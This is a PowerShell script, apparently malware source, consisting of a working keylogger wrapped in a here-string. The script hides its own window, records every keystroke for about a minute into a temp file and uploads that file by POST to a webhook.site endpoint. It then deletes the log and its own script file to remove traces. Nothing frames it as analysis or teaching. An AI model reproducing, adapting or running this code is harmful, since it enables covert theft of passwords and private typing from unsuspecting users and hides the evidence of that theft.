${P`Ut} = @"
`$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'                                                            
add-type -name win -member `$t -namespace native                             
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)                                           
                                                                             
function Start-KeyLogger(`$P = "$env:temp\kl.txt") {                         
    `$si = @'                                                                
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]      
    public static extern short GetAsyncKeyState(int virtualKeyCode);         
    [DllImport("user32.dll", CharSet=CharSet.Auto)]                          
    public static extern int GetKeyboardState(byte[] keystate);              
    [DllImport("user32.dll", CharSet=CharSet.Auto)]                          
    public static extern int MapVirtualKey(uint uCode, int uMapType);        
    [DllImport("user32.dll", CharSet=CharSet.Auto)]                          
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);   
'@                                                                           
                                                                             
    `$A = Add-Type -MemberDefinition `$si -Name 'Win32' -Namespace API -PassThru                                                                          
    `$null = New-Item -Path `$P -ItemType File -Force                        
                                                                             
    try {                                                                    
        `$ti = get-date                                                      
        do {                                                                 
            Start-Sleep -Milliseconds 40                                     
            for (`$as = 9; `$as -le 254; `$as++) {                           
                `$state = `$A::GetAsyncKeyState(`$as)                        
                if (`$state -eq -32767) {                                    
                    `$null = [console]::CapsLock                             
                    `$VK = `$A::MapVirtualKey(`$as`, 3)                      
                    `$kbS = New-Object Byte[] 256                            
                    `$checkkbstate = `$A::GetKeyboardState(`$kbS`)           
                    `$mychar = New-Object -TypeName System.Text.StringBuilder
                    `$success = `$A::ToUnicode(`$as`, `$VK`, `$kbS`, `$mychar`, `$mychar`.Capacity, 0)                                                    
                    if (`$success) {                                         
                        [System.IO.File]::AppendAllText(`$P, `$mychar, [System.Text.Encoding]::Unicode)                                                   
                    }                                                        
                }                                                            
            }                                                                
        }                                                                    
        while ((Get-Date).AddMinutes(-1) -le `$ti)                           
    }                                                                        
    finally {                                                                
        powershell Invoke-WebRequest -Uri https://webhook.site/ddd9d09b-3ca5-4db0-9dba-705bb141c2ec -Method POST -ContentType 'text/plain' -InFile "$env:temp\kl.txt"                                                                  
        powershell Remove-Item -Path "$env:temp\kl.txt"                      
        powershell Remove-Item -Path "$env:temp\log.ps1"                     
    }                                                                        
}                                                                            
                                                                             
Start-KeyLogger                                                              
"@                                                                           
                                                                             
